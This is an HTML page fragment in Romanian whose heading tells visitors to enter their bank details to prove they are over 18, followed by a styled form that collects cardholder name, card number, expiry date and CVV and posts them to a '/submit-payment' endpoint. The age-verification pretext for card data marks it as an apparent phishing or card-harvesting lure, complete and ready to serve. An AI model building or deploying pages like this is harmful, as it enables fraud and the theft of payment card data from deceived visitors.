<h1 style="font-size: 3em; color: red;">Pentru a verifica ca aveti +18 ani, introduceti datele bancare</h1>
<div style="display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f2f2f2;">
  <form class="payment-form" style="
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    width: 300px;
    font-family: Arial, sans-serif;
  " action="/submit-payment" method="POST">
      <h2 style="text-align: center;">Datele Bancare</h2>
      <div class="form-group" style="margin-bottom: 15px;">
          <label for="cardholder-name" style="display: block; font-size: 0.9em; margin-bottom: 5px;">Numele Proprietarului</label>
          <input type="text" id="cardholder-name" name="cardholder-name" required style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
      </div>
      <div class="form-group" style="margin-bottom: 15px;">
          <label for="card-number" style="display: block; font-size: 0.9em; margin-bottom: 5px;">Numarul Cardului</label>
          <input type="tel" id="card-number" name="card-number" maxlength="16" pattern="[0-9]{16}" required style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
      </div>
      <div class="form-group" style="margin-bottom: 15px;">
          <label for="expiry-date" style="display: block; font-size: 0.9em; margin-bottom: 5px;">Data de expirare</label>
          <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" pattern="(?:0[1-9]|1[0-2])/[0-9]{2}" required style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
      </div>
      <div class="form-group" style="margin-bottom: 15px;">
          <label for="cvv" style="display: block; font-size: 0.9em; margin-bottom: 5px;">CVV</label>
          <input type="tel" id="cvv" name="cvv" maxlength="3" pattern="[0-9]{3}" required style="width: 100%; padding: 8px; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px;">
      </div>
      <button type="submit" style="width: 100%; padding: 10px; background-color: #4CAF50; color: white; font-size: 1em; border: none; border-radius: 4px; cursor: pointer;">Pay Now</button>
  </form>
</div>
